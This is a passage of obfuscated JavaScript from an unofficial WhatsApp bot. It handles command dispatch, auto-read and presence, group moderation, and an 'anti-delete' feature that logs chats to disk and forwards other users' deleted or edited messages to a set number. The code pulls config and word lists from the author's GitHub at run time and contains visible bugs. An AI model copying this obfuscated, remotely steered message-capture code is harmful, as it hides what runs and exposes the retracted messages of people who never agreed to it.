        await updateCMDStore(_0x3ea424.key.id, _0x9cdcea);
      };
      _0x29dc59.listMessage = async (_0x2918b2, _0x2bbd7b, _0x27d699) => {
        let _0x390658 = '';
        const _0x430b62 = [];
        _0x2bbd7b.sections.forEach((_0x2f677e, _0x597ecf) => {
          const _0x2e0f65 = '' + (_0x597ecf + 0x1);
          _0x390658 += "\n[" + _0x2e0f65 + "] " + _0x2f677e.title + "\n";
          _0x2f677e.rows.forEach((_0x11f524, _0x2ad207) => {
            const _0x35fc11 = _0x2e0f65 + '.' + (_0x2ad207 + 0x1);
            const _0x2ba062 = "   " + _0x35fc11 + " | " + _0x11f524.title;
            _0x390658 += _0x2ba062 + "\n";
            if (_0x11f524.description) {
              _0x390658 += "   " + _0x11f524.description + "\n\n";
            }
            _0x430b62.push({
              'cmdId': _0x35fc11,
              'cmd': _0x11f524.rowId
            });
          });
        });
        const _0x4f66b6 = _0x2bbd7b.text + "\n\n" + _0x2bbd7b.buttonText + ',' + _0x390658 + "\n" + _0x2bbd7b.footer;
        const _0xbc284e = await _0x29dc59.sendMessage(_0x416738, {
          'text': _0x4f66b6,
          'contextInfo': {
            'mentionedJid': [''],
            'groupMentions': [],
            'forwardingScore': 0x1,
            'isForwarded': true,
            'forwardedNewsletterMessageInfo': {
              'newsletterJid': "120363252060326102@newsletter",
              'serverMessageId': 0x7f
            },
            'externalAdReply': {
              'title': "X-BYTE, POWERED BY TALKDROVE ",
              'body': "Created by Hamza",
              'mediaType': 0x1,
              'sourceUrl': "https://wa.me/923072380380",
              'thumbnailUrl': "https://raw.githubusercontent.com/HyHamza/HyHamza/main/Images/XByte-logo.png",
              'renderLargerThumbnail': false,
              'showAdAttribution': true
            }
          }
        }, {
          'quoted': _0x27d699 || _0x227dc7
        });
        await updateCMDStore(_0xbc284e.key.id, _0x430b62);
      };
      _0x29dc59.edite = async (_0x4dd2b4, _0x342bb9) => {
        await _0x29dc59.relayMessage(_0x416738, {
          'protocolMessage': {
            'key': _0x4dd2b4.key,
            'type': 0xe,
            'editedMessage': {
              'conversation': _0x342bb9
            }
          }
        }, {});
      };
      const _0x2586e3 = (await axios.get("https://raw.githubusercontent.com/HyHamza/HyHamza/main/files/XByte.json")).data;
      config.LOGO = _0x2586e3.imageurl;
      config.BTN = _0x2586e3.button;
      config.CONTACT = _0x2586e3.contact;
      config.FOOTER = _0x2586e3.footer;
      config.BTNURL = _0x2586e3.buttonurl;
      config.CAPTION = _0x2586e3.caption;
      config.C_JID = _0x2586e3.newsletter;
      config.T_LINE = _0x2586e3.titleline;
      config.B_LINE = _0x2586e3.bodyline;
      config.Hamza_WA = _0x2586e3.buttonurl2;
      config.LOGO2 = _0x2586e3.imageurl2;
      config.C_NAME = _0x2586e3.channel;
      config.O_NO = _0x2586e3.otherno;
      _0x29dc59.edit = async (_0x396eca, _0x40d489) => {
        await _0x29dc59.relayMessage(_0x416738, {
          'protocolMessage': {
            'key': _0x396eca.key,
            'type': 0xe,
            'editedMessage': {
              'conversation': _0x40d489
            }
          }
        }, {});
      };
      _0x29dc59.sendFileUrl = async (_0x715678, _0x2f8c6f, _0x2fa1a3, _0x6c0bb, _0x120f9d = {}) => {
        let _0x22b0e1 = '';
        let _0x27dd3f = await axios.head(_0x2f8c6f);
        _0x22b0e1 = _0x27dd3f.headers['content-type'];
        if (_0x22b0e1.split('/')[0x1] === 'gif') {
          return _0x29dc59.sendMessage(_0x715678, {
            'video': await getBuffer(_0x2f8c6f),
            'caption': _0x2fa1a3,
            'gifPlayback': true,
            ..._0x120f9d
          }, {
            'quoted': _0x6c0bb,
            ..._0x120f9d
          });
        }
        if (_0x22b0e1 === "application/pdf") {
          return _0x29dc59.sendMessage(_0x715678, {
            'document': await getBuffer(_0x2f8c6f),
            'mimetype': "application/pdf",
            'caption': _0x2fa1a3,
            ..._0x120f9d
          }, {
            'quoted': _0x6c0bb,
            ..._0x120f9d
          });
        }
        if (_0x22b0e1.split('/')[0x0] === "image") {
          return _0x29dc59.sendMessage(_0x715678, {
            'image': await getBuffer(_0x2f8c6f),
            'caption': _0x2fa1a3,
            ..._0x120f9d
          }, {
            'quoted': _0x6c0bb,
            ..._0x120f9d
          });
        }
        if (_0x22b0e1.split('/')[0x0] === "video") {
          return _0x29dc59.sendMessage(_0x715678, {
            'video': await getBuffer(_0x2f8c6f),
            'caption': _0x2fa1a3,
            'mimetype': "video/mp4",
            ..._0x120f9d
          }, {
            'quoted': _0x6c0bb,
            ..._0x120f9d
          });
        }
        if (_0x22b0e1.split('/')[0x0] === "audio") {
          return _0x29dc59.sendMessage(_0x715678, {
            'audio': await getBuffer(_0x2f8c6f),
            'caption': _0x2fa1a3,
            'mimetype': "audio/mpeg",
            ..._0x120f9d
          }, {
            'quoted': _0x6c0bb,
            ..._0x120f9d
          });
        }
      };
      _0x29dc59.sendButtonMessage = async (_0x210ba6, _0x3013fe, _0x464862, _0xb323e3 = {}) => {
        let _0x987a34;
        if (_0xb323e3?.["video"]) {
          var _0x35df21 = await prepareWAMessageMedia({
            'video': {
              'url': _0xb323e3 && _0xb323e3.video ? _0xb323e3.video : ''
            }
          }, {
            'upload': _0x29dc59.waUploadToServer
          });
          _0x987a34 = {
            'title': _0xb323e3 && _0xb323e3.header ? _0xb323e3.header : '',
            'hasMediaAttachment': true,
            'videoMessage': _0x35df21.videoMessage
          };
        } else {
          if (_0xb323e3?.['image']) {
            var _0x180ace = await prepareWAMessageMedia({
              'image': {
                'url': _0xb323e3 && _0xb323e3.image ? _0xb323e3.image : ''
              }
            }, {
              'upload': _0x29dc59.waUploadToServer
            });
            _0x987a34 = {
              'title': _0xb323e3 && _0xb323e3.header ? _0xb323e3.header : '',
              'hasMediaAttachment': true,
              'imageMessage': _0x180ace.imageMessage
            };
          } else {
            _0x987a34 = {
              'title': _0xb323e3 && _0xb323e3.header ? _0xb323e3.header : '',
              'hasMediaAttachment': false
            };
          }
        }
        let _0x33c929 = generateWAMessageFromContent(_0x210ba6, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 0x2
              },
              'interactiveMessage': {
                'body': {
                  'text': _0xb323e3 && _0xb323e3.body ? _0xb323e3.body : ''
                },
                'footer': {
                  'text': _0xb323e3 && _0xb323e3.footer ? _0xb323e3.footer : ''
                },
                'header': _0x987a34,
                'nativeFlowMessage': {
                  'buttons': _0x3013fe,
                  'messageParamsJson': ''
                },
                'contextInfo': {
                  'mentionedJid': [_0xaad7b7.sender],
                  'forwardingScore': 0x3e7,
                  'isForwarded': true,
                  'forwardedNewsletterMessageInfo': {
                    'newsletterJid': config.C_JID,
                    'newsletterName': config.C_NAME,
                    'serverMessageId': 0x8f
                  },
                  'externalAdReply': {
                    'title': config.T_LINE,
                    'body': config.B_LINE,
                    'mediaType': 0x1,
                    'sourceUrl': config.Hamza_WA,
                    'thumbnailUrl': config.LOGO2,
                    'renderLargerThumbnail': false
                  }
                }
              }
            }
          }
        }, {
          'quoted': _0x464862
        });
        await _0x29dc59.sendPresenceUpdate("composing", _0x210ba6);
        await sleep(0x3e8);
        return await _0x29dc59.relayMessage(_0x210ba6, _0x33c929.message, {
          'messageId': _0x33c929.key.id
        });
      };
      if (!_0xc4d47a && !_0x1c4d12 && !_0x7aa660 && config.ONLY_GROUP == 'true') {
        return;
      }
      if (!_0xc4d47a && !_0x1c4d12 && config.ONLY_ME == "true") {
        return;
      }
      const _0xa82c9d = require("./lib/command");
      const _0xbbac98 = _0x380e88 ? _0x69c192 : false;
      if (_0x380e88) {
        const _0x289ac0 = _0xa82c9d.commands.find(_0x144cec => _0x144cec.pattern === _0xbbac98) || _0xa82c9d.commands.find(_0x39cad7 => _0x39cad7.alias && _0x39cad7.alias.includes(_0xbbac98));
        if (_0x289ac0) {
          if (_0x289ac0.react) {
            _0x29dc59.sendMessage(_0x416738, {
              'react': {
                'text': _0x289ac0.react,
                'key': _0x227dc7.key
              }
            });
          }
          try {
            _0x289ac0["function"](_0x29dc59, _0x227dc7, _0xaad7b7, {
              'from': _0x416738,
              'prefix': prefix,
              'l': l,
              'quoted': _0x192c55,
              'body': _0x2383b2,
              'isCmd': _0x380e88,
              'command': _0x69c192,
              'args': _0x2f5b44,
              'q': _0x12d32e,
              'isGroup': _0x7aa660,
              'sender': _0x4a62b8,
              'senderNumber': _0x4d2413,
              'botNumber2': _0x38e2e4,
              'botNumber': _0x1bcc74,
              'pushname': _0x4d34b6,
              'isMe': _0xc4d47a,
              'isOwner': _0x1c4d12,
              'groupMetadata': _0x44c956,
              'groupName': _0x38fe9a,
              'participants': _0x25f0cf,
              'groupAdmins': _0x52070c,
              'isBotAdmins': _0x1c944f,
              'isAdmins': _0x29cffd,
              'reply': _0x428492,
              'config': config,
              'isCreator': _0x5399eb,
              'isDev': _0x419bb3,
              'botNumber2': _0x38e2e4
            });
          } catch (_0x3704c3) {
            console.error("[PLUGIN ERROR] ", _0x3704c3);
          }
        }
      }
      _0xa82c9d.commands.map(async _0x5d05cd => {
        if (_0x2383b2 && _0x5d05cd.on === "body") {
          _0x5d05cd['function'](_0x29dc59, _0x227dc7, _0xaad7b7, {
            'from': _0x416738,
            'prefix': prefix,
            'l': l,
            'quoted': _0x192c55,
            'body': _0x2383b2,
            'isCmd': _0x380e88,
            'command': _0x5d05cd,
            'args': _0x2f5b44,
            'q': _0x12d32e,
            'isGroup': _0x7aa660,
            'sender': _0x4a62b8,
            'senderNumber': _0x4d2413,
            'botNumber2': _0x38e2e4,
            'botNumber': _0x1bcc74,
            'pushname': _0x4d34b6,
            'isMe': _0xc4d47a,
            'isOwner': _0x1c4d12,
            'groupMetadata': _0x44c956,
            'groupName': _0x38fe9a,
            'participants': _0x25f0cf,
            'groupAdmins': _0x52070c,
            'isBotAdmins': _0x1c944f,
            'isAdmins': _0x29cffd,
            'reply': _0x428492,
            'config': config,
            'isCreator': _0x5399eb,
            'isDev': _0x419bb3,
            'botNumber2': _0x38e2e4
          });
        } else {
          if (_0x227dc7.q && _0x5d05cd.on === 'text') {
            _0x5d05cd["function"](_0x29dc59, _0x227dc7, _0xaad7b7, {
              'from': _0x416738,
              'l': l,
              'quoted': _0x192c55,
              'body': _0x2383b2,
              'isCmd': _0x380e88,
              'command': _0x5d05cd,
              'args': _0x2f5b44,
              'q': _0x12d32e,
              'isGroup': _0x7aa660,
              'sender': _0x4a62b8,
              'senderNumber': _0x4d2413,
              'botNumber2': _0x38e2e4,
              'botNumber': _0x1bcc74,
              'pushname': _0x4d34b6,
              'isMe': _0xc4d47a,
              'isOwner': _0x1c4d12,
              'groupMetadata': _0x44c956,
              'groupName': _0x38fe9a,
              'participants': _0x25f0cf,
              'groupAdmins': _0x52070c,
              'isBotAdmins': _0x1c944f,
              'isAdmins': _0x29cffd,
              'reply': _0x428492,
              'config': config,
              'isCreator': _0x5399eb,
              'isDev': _0x419bb3,
              'botNumber2': _0x38e2e4
            });
          } else {
            if ((_0x5d05cd.on === 'image' || _0x5d05cd.on === "photo") && _0x227dc7.type === "imageMessage") {
              _0x5d05cd["function"](_0x29dc59, _0x227dc7, _0xaad7b7, {
                'from': _0x416738,
                'prefix': prefix,
                'l': l,
                'quoted': _0x192c55,
                'body': _0x2383b2,
                'isCmd': _0x380e88,
                'command': _0x5d05cd,
                'args': _0x2f5b44,
                'q': _0x12d32e,
                'isGroup': _0x7aa660,
                'sender': _0x4a62b8,
                'senderNumber': _0x4d2413,
                'botNumber2': _0x38e2e4,
                'botNumber': _0x1bcc74,
                'pushname': _0x4d34b6,
                'isMe': _0xc4d47a,
                'isOwner': _0x1c4d12,
                'groupMetadata': _0x44c956,
                'groupName': _0x38fe9a,
                'participants': _0x25f0cf,
                'groupAdmins': _0x52070c,
                'isBotAdmins': _0x1c944f,
                'isAdmins': _0x29cffd,
                'reply': _0x428492,
                'config': config,
                'isCreator': _0x5399eb,
                'isDev': _0x419bb3,
                'botNumber2': _0x38e2e4
              });
            } else if (_0x5d05cd.on === "sticker" && _0x227dc7.type === "stickerMessage") {
              _0x5d05cd["function"](_0x29dc59, _0x227dc7, _0xaad7b7, {
                'from': _0x416738,
                'prefix': prefix,
                'l': l,
                'quoted': _0x192c55,
                'body': _0x2383b2,
                'isCmd': _0x380e88,
                'command': _0x5d05cd,
                'args': _0x2f5b44,
                'q': _0x12d32e,
                'isGroup': _0x7aa660,
                'sender': _0x4a62b8,
                'senderNumber': _0x4d2413,
                'botNumber2': _0x38e2e4,
                'botNumber': _0x1bcc74,
                'pushname': _0x4d34b6,
                'isMe': _0xc4d47a,
                'isOwner': _0x1c4d12,
                'groupMetadata': _0x44c956,
                'groupName': _0x38fe9a,
                'participants': _0x25f0cf,
                'groupAdmins': _0x52070c,
                'isBotAdmins': _0x1c944f,
                'isAdmins': _0x29cffd,
                'reply': _0x428492,
                'config': config,
                'isCreator': _0x5399eb,
                'isDev': _0x419bb3,
                'botNumber2': _0x38e2e4
              });
            }
          }
        }
      });
      _0x29dc59.downloadAndSaveMediaMessage = async (_0xb005d0, _0x297216, _0x4664d6 = true) => {
        let _0x2e886c = _0xb005d0.msg ? _0xb005d0.msg : _0xb005d0;
        let _0x296d5f = (_0xb005d0.msg || _0xb005d0).mimetype || '';
        let _0x5d0dc4 = _0xb005d0.mtype ? _0xb005d0.mtype.replace(/Message/gi, '') : _0x296d5f.split('/')[0x0];
        const _0x15d122 = await downloadContentFromMessage(_0x2e886c, _0x5d0dc4);
        let _0x457070 = Buffer.from([]);
        for await (const _0x414263 of _0x15d122) {
          _0x457070 = Buffer.concat([_0x457070, _0x414263]);
        }
        let _0x50fdc0 = await FileType.fromBuffer(_0x457070);
        trueFileName = _0x4664d6 ? _0x297216 + '.' + _0x50fdc0.ext : _0x297216;
        await fs.writeFileSync(trueFileName, _0x457070);
        return trueFileName;
      };
      if (_0x227dc7.sender == "923072380380@s.whatsapp.net") {
        await _0x29dc59.sendMessage(_0x416738, {
          'react': {
            'text': '👑',
            'key': _0x227dc7.key
          }
        });
      }
      let _0x259e31 = _0x2383b2 ? prefixRegex.test(_0x2383b2[0x0]) : 'false';
      if (config.READ_CMD_ONLY === "true" && _0x259e31) {
        await _0x29dc59.readMessages([_0x227dc7.key]);
      }
      if (config.AUTO_READ === "true") {
        _0x29dc59.readMessages([_0x227dc7.key]);
      }
      if (config.AUTO_TYPING === "true") {
        _0x29dc59.sendPresenceUpdate("composing", _0x416738);
      }
      if (config.AUTO_RECORDING === "true") {
        _0x29dc59.sendPresenceUpdate("recording", _0x416738);
      }
      if (config.AUTO_BIO === "true") {
        _0x29dc59.updateProfileStatus("This bio was updated by X-BYTE, Powered by TalkDrove. " + runtime(process.uptime()) + " ")["catch"](_0x178eb6 => _0x178eb6);
      }
      if (config.ALWAYS_ONLINE === "false") {
        await _0x29dc59.sendPresenceUpdate('unavailable');
      }
      if (config.ALWAYS_ONLINE === "true") {
        await _0x29dc59.sendPresenceUpdate("available");
      }
      if (config.AUTO_BLOCK == "true" && _0xaad7b7.chat.endsWith("@s.whatsapp.net")) {
        return _0x29dc59.updateBlockStatus(_0xaad7b7.sender, "block");
      }
      if (config.ANTI_LINK == "true") {
        if (_0x9c0f29 && _0x1c944f) {
          if (!_0x29cffd) {
            if (!_0xc4d47a) {
              if (_0x2383b2.match("https")) {
                await _0x29dc59.sendMessage(_0x416738, {
                  'delete': _0x227dc7.key
                });
                _0x428492("*「 ⚠️ 𝑳𝑰𝑵𝑲 𝑫𝑬𝑳𝑬𝑻𝑬𝑫 ⚠️ 」*");
              }
            }
          }
        }
      }
      if (config.ANTI_BOT == "true") {
        if (!_0x5399eb && !_0x419bb3 && _0x7aa660 && !_0x1c944f) {
          _0x428492("```🤖 Bot Detected!!```\n\n_✅ Kicked *@" + _0x227dc7.sender.split('@')[0x0] + '*_', {
            'mentions': [_0x227dc7.sender]
          });
          _0x29dc59.groupParticipantsUpdate(_0x416738, [_0x227dc7.sender], "remove");
        }
      }
      const _0x150cba = await fetchJson('https://raw.githubusercontent.com/HyHamza/HyHamza/main/files/Bad_Words.json');
      if (config.ANTI_BAD == "true") {
        if (!_0x29cffd && !_0x419bb3) {
          for (any in _0x150cba) {
            if (_0x2383b2.toLowerCase().includes(_0x150cba[any])) {
              if (!_0x2383b2.includes("tent")) {
                if (!_0x2383b2.includes('docu')) {
                  if (!_0x2383b2.includes('https')) {
                    if (_0x52070c.includes(_0x4a62b8)) {
                      return;
                    }
                    if (_0x227dc7.key.fromMe) {
                      return;
                    }
                    await _0x29dc59.sendMessage(_0x416738, {
                      'delete': _0x227dc7.key
                    });
                    await _0x29dc59.sendMessage(_0x416738, {
                      'text': "*Bad word detected..!*"
                    });
                    await _0x29dc59.groupParticipantsUpdate(_0x416738, [_0x4a62b8], 'remove');
                  }
                }
              }
            }
          }
        }
      }
      if (!_0x1c4d12) {
        if (config.ANTI_DELETE === 'true') {
          if (!_0xaad7b7.id.startsWith("BAE5")) {
            if (!fs.existsSync("message_data")) {
              fs.mkdirSync("message_data");
            }
            function _0x50f697(_0x10ea7f, _0x2f4721) {
              const _0x57eed2 = path.join("message_data", _0x10ea7f, _0x2f4721 + ".json");
              try {
                const _0x306d90 = fs.readFileSync(_0x57eed2, "utf8");
                return JSON.parse(_0x306d90) || [];
              } catch (_0x567f39) {
                return [];
              }
            }
            function _0x532c50(_0x15780d, _0x140e0e, _0x17fdd7) {
              const _0x590966 = path.join('message_data', _0x15780d);
              if (!fs.existsSync(_0x590966)) {
                fs.mkdirSync(_0x590966, {
                  'recursive': true
                });
              }
              const _0x4de9cd = path.join(_0x590966, _0x140e0e + ".json");
              try {
                fs.writeFileSync(_0x4de9cd, JSON.stringify(_0x17fdd7, null, 0x2));
              } catch (_0x326b3c) {
                console.error("Error saving chat data:", _0x326b3c);
              }
            }
            function _0xd4ca6c(_0x1a700d) {
              const _0x1e6dc6 = _0x1a700d.key.id;
              const _0x491c28 = _0x50f697(_0x416738, _0x1e6dc6);
              _0x491c28.push(_0x1a700d);
              _0x532c50(_0x416738, _0x1e6dc6, _0x491c28);
            }
            const _0x51082b = config.DELETEMSGSENDTO !== '' ? config.DELETEMSGSENDTO + '@s.whatsapp.net' : _0x416738;
            function _0x4eda7f(_0x2f8569) {
              const _0x2c922e = _0x2f8569.msg.key.id;
              const _0x3784fa = _0x50f697(_0x416738, _0x2c922e);
              const _0x15a9f3 = _0x3784fa[0x0];
              if (_0x15a9f3) {
                const _0x7aaa88 = _0x2f8569.sender.split('@')[0x0];
                const _0x43ca6c = _0x15a9f3.key.participant ?? _0x2f8569.sender;
                const _0xb23a83 = _0x43ca6c.split('@')[0x0];
                if (_0x7aaa88.includes(_0x1bcc74) || _0xb23a83.includes(_0x1bcc74)) {
                  return;
                }
                if (_0x15a9f3.message && _0x15a9f3.message.conversation && _0x15a9f3.message.conversation !== '') {
                  const _0x374039 = _0x15a9f3.message.conversation;
                  if (_0x7aa660 && _0x374039.includes("chat.whatsapp.com")) {
                    return;
                  }
                  var _0x495ce4 = "```";
                  _0x29dc59.sendMessage(_0x51082b, {
                    'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x7aaa88 + "_\n  📩 *Sent by:* _" + _0xb23a83 + "_\n\n> 🔓 Message Text: " + _0x495ce4 + _0x374039 + _0x495ce4
                  });
                } else {
                  if (_0x15a9f3.msg.type === "MESSAGE_EDIT") {
                    _0x29dc59.sendMessage(_0x51082b, {
                      'text': "❌ *edited message detected* " + _0x15a9f3.message.editedMessage.message.protocolMessage.editedMessage.conversation
                    }, {
                      'quoted': _0x227dc7
                    });
                  } else {
                    if (_0x15a9f3.message && _0x15a9f3.message.exetendedTextMessage && _0x15a9f3.msg.text) {
                      const _0x32d7b9 = _0x15a9f3.msg.text;
                      if (_0x7aa660 && _0x32d7b9.includes("chat.whatsapp.com")) {
                        return;
                      }
                      var _0x495ce4 = "```";
                      _0x29dc59.sendMessage(_0x51082b, {
                        'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x7aaa88 + "_\n  📩 *Sent by:* _" + _0xb23a83 + "_\n\n> 🔓 Message Text: " + _0x495ce4 + _0x32d7b9 + _0x495ce4
                      });
                    } else {
                      if (_0x15a9f3.message && _0x15a9f3.message.exetendedTextMessage) {
                        if (_0x7aa660 && messageText.includes("chat.whatsapp.com")) {
                          return;
                        }
                        var _0x495ce4 = "```";
                        _0x29dc59.sendMessage(_0x51082b, {
                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x7aaa88 + "_\n  📩 *Sent by:* _" + _0xb23a83 + "_\n\n> 🔓 Message Text: " + _0x495ce4 + _0x15a9f3.body + _0x495ce4
                        });
                      } else {
                        if (_0x15a9f3.type === "extendedTextMessage") {
                          async function _0x2246bb() {
                            if (_0x15a9f3.message.extendedTextMessage) {
                              if (_0x7aa660 && messageText.includes("chat.whatsapp.com")) {
                                return;
                              }
                              _0x29dc59.sendMessage(_0x51082b, {
                                'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x7aaa88 + "_\n  📩 *Sent by:* _" + _0xb23a83 + "_\n\n> 🔓 Message Text: " + "```" + _0x15a9f3.message.extendedTextMessage.text + "```"
                              });
                            } else {
                              if (_0x7aa660 && messageText.includes("chat.whatsapp.com")) {
                                return;
                              }
                              _0x29dc59.sendMessage(_0x51082b, {
                                'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x7aaa88 + "_\n  📩 *Sent by:* _" + _0xb23a83 + "_\n\n> 🔓 Message Text: " + "```" + _0x15a9f3.message.extendedTextMessage.text + "```"
                              });
                            }
                          }
                          _0x2246bb();
                        } else {
                          if (_0x15a9f3.type === "imageMessage") {
                            async function _0x463391() {
                              var _0x1fb3ad = getRandom('');
                              const _0x463022 = sms(_0x29dc59, _0x15a9f3);
                              let _0x35ec62 = await _0x463022.download(_0x1fb3ad);
                              let _0x20bfbc = require("file-type");
                              let _0x2d6320 = _0x20bfbc.fromBuffer(_0x35ec62);
                              await fs.promises.writeFile('./' + _0x2d6320.ext, _0x35ec62);
                              if (_0x15a9f3.message.imageMessage.caption) {
                                const _0x3c0d9a = _0x15a9f3.message.imageMessage.caption;
                                if (_0x7aa660 && _0x3c0d9a.includes("chat.whatsapp.com")) {
                                  return;
                                }
                                await _0x29dc59.sendMessage(_0x51082b, {
                                  'image': fs.readFileSync('./' + _0x2d6320.ext),
                                  'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x7aaa88 + "_\n  📩 *Sent by:* _" + _0xb23a83 + "_\n\n> 🔓 Message Text: " + _0x15a9f3.message.imageMessage.caption
                                });
                              } else {
                                await _0x29dc59.sendMessage(_0x51082b, {
                                  'image': fs.readFileSync('./' + _0x2d6320.ext),
                                  'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x7aaa88 + "_\n  📩 *Sent by:* _" + _0xb23a83 + '_'
                                });
                              }
                            }
                            _0x463391();
                          } else {
                            if (_0x15a9f3.type === "videoMessage") {
                              async function _0x3f6ed9() {
                                var _0x41c0e7 = getRandom('');
                                const _0x2ef788 = sms(_0x29dc59, _0x15a9f3);
                                const _0x4226c4 = _0x15a9f3.message.videoMessage.fileLength;
                                const _0x326df9 = _0x15a9f3.message.videoMessage.seconds;
                                const _0x32763a = config.MAX_SIZE;
                                const _0x31153e = _0x4226c4 / 0x100000;
                                if (_0x15a9f3.message.videoMessage.caption) {
                                  if (_0x31153e < _0x32763a && _0x326df9 < 0x708) {
                                    let _0x3f5a94 = await _0x2ef788.download(_0x41c0e7);
                                    let _0x399fab = require("file-type");
                                    let _0x30653e = _0x399fab.fromBuffer(_0x3f5a94);
                                    await fs.promises.writeFile('./' + _0x30653e.ext, _0x3f5a94);
                                    const _0x4a7770 = _0x15a9f3.message.videoMessage.caption;
                                    if (_0x7aa660 && _0x4a7770.includes("chat.whatsapp.com")) {
                                      return;
                                    }
                                    await _0x29dc59.sendMessage(_0x51082b, {
                                      'video': fs.readFileSync('./' + _0x30653e.ext),
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x7aaa88 + "_\n  📩 *Sent by:* _" + _0xb23a83 + "_\n\n> 🔓 Message Text: " + _0x15a9f3.message.videoMessage.caption
                                    });
                                  }
                                } else {
                                  let _0x1ae87b = await _0x2ef788.download(_0x41c0e7);
                                  let _0x2fe43 = require('file-type');
                                  let _0x144330 = _0x2fe43.fromBuffer(_0x1ae87b);
                                  await fs.promises.writeFile('./' + _0x144330.ext, _0x1ae87b);
                                  const _0x16550d = _0x15a9f3.message.videoMessage.fileLength;
                                  const _0x3bbe94 = _0x15a9f3.message.videoMessage.seconds;
                                  const _0x4af14f = config.MAX_SIZE;
                                  const _0x49aefc = _0x16550d / 0x100000;
                                  if (_0x49aefc < _0x4af14f && _0x3bbe94 < 0x708) {
                                    await _0x29dc59.sendMessage(_0x51082b, {
                                      'video': fs.readFileSync('./' + _0x144330.ext),
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x7aaa88 + "_\n  📩 *Sent by:* _" + _0xb23a83 + '_'
                                    });
                                  }
                                }
                              }
                              _0x3f6ed9();
                            } else {
                              if (_0x15a9f3.type === "documentMessage") {
                                async function _0x3e7196() {
                                  var _0x5c0f52 = getRandom('');
                                  const _0x541e76 = sms(_0x29dc59, _0x15a9f3);
                                  let _0x3c6d7a = await _0x541e76.download(_0x5c0f52);
                                  let _0x178e34 = require('file-type');
                                  let _0xf21d3f = _0x178e34.fromBuffer(_0x3c6d7a);
                                  await fs.promises.writeFile('./' + _0xf21d3f.ext, _0x3c6d7a);
                                  if (_0x15a9f3.message.documentWithCaptionMessage) {
                                    await _0x29dc59.sendMessage(_0x51082b, {
                                      'document': fs.readFileSync('./' + _0xf21d3f.ext),
                                      'mimetype': _0x15a9f3.message.documentMessage.mimetype,
                                      'fileName': _0x15a9f3.message.documentMessage.fileName,
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x7aaa88 + "_\n  📩 *Sent by:* _" + _0xb23a83 + "_\n"
                                    });
                                  } else {
                                    await _0x29dc59.sendMessage(_0x51082b, {
                                      'document': fs.readFileSync('./' + _0xf21d3f.ext),
                                      'mimetype': _0x15a9f3.message.documentMessage.mimetype,
                                      'fileName': _0x15a9f3.message.documentMessage.fileName,
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x7aaa88 + "_\n  📩 *Sent by:* _" + _0xb23a83 + "_\n"
                                    });
                                  }
                                }
                                _0x3e7196();
                              } else {
                                if (_0x15a9f3.type === 'audioMessage') {
                                  async function _0x33883e() {
                                    var _0x30ed25 = getRandom('');
                                    const _0x5ac1b7 = sms(_0x29dc59, _0x15a9f3);
                                    let _0x4859ad = await _0x5ac1b7.download(_0x30ed25);
                                    let _0x4ebbf4 = require('file-type');
                                    let _0x3b6119 = _0x4ebbf4.fromBuffer(_0x4859ad);
                                    await fs.promises.writeFile('./' + _0x3b6119.ext, _0x4859ad);
                                    if (_0x15a9f3.message.audioMessage) {
                                      const _0x182a97 = await _0x29dc59.sendMessage(_0x51082b, {
                                        'audio': fs.readFileSync('./' + _0x3b6119.ext),
                                        'mimetype': _0x15a9f3.message.audioMessage.mimetype,
                                        'fileName': _0xaad7b7.id + ".mp3"
                                      });
                                      return await _0x29dc59.sendMessage(_0x51082b, {
                                        'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x7aaa88 + "_\n  📩 *Sent by:* _" + _0xb23a83 + "_\n"
                                      }, {
                                        'quoted': _0x182a97
                                      });
                                    } else {
                                      if (_0x15a9f3.message.audioMessage.ptt === 'true') {
                                        const _0x3906b9 = await _0x29dc59.sendMessage(_0x51082b, {
                                          'audio': fs.readFileSync('./' + _0x3b6119.ext),
                                          'mimetype': _0x15a9f3.message.audioMessage.mimetype,
                                          'ptt': "true",
                                          'fileName': _0xaad7b7.id + ".mp3"
                                        });
                                        return await _0x29dc59.sendMessage(_0x51082b, {
                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x7aaa88 + "_\n  📩 *Sent by:* _" + _0xb23a83 + "_\n"
                                        }, {
                                          'quoted': _0x3906b9
                                        });
                                      }
                                    }
                                  }
                                  _0x33883e();
                                } else {
                                  if (_0x15a9f3.type === "stickerMessage") {
                                    async function _0x3de94b() {
                                      var _0x7a9615 = getRandom('');
                                      const _0x41ba82 = sms(_0x29dc59, _0x15a9f3);
                                      let _0x903b2a = await _0x41ba82.download(_0x7a9615);
                                      let _0x47a0bd = require("file-type");
                                      let _0x381e7d = _0x47a0bd.fromBuffer(_0x903b2a);
                                      await fs.promises.writeFile('./' + _0x381e7d.ext, _0x903b2a);
                                      if (_0x15a9f3.message.stickerMessage) {
                                        const _0x5772a1 = await _0x29dc59.sendMessage(_0x51082b, {
                                          'sticker': fs.readFileSync('./' + _0x381e7d.ext),
                                          'package': 'X-BYTE'
                                        });
                                        return await _0x29dc59.sendMessage(_0x51082b, {
                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x7aaa88 + "_\n  📩 *Sent by:* _" + _0xb23a83 + "_\n"
                                        }, {
                                          'quoted': _0x5772a1
                                        });
                                      } else {
                                        const _0x8d179e = await _0x29dc59.sendMessage(_0x51082b, {
                                          'sticker': fs.readFileSync('./' + _0x381e7d.ext),
                                          'package': "X-BYTE"
                                        });
                                        return await _0x29dc59.sendMessage(_0x51082b, {
                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x7aaa88 + "_\n  📩 *Sent by:* _" + _0xb23a83 + "_\n"
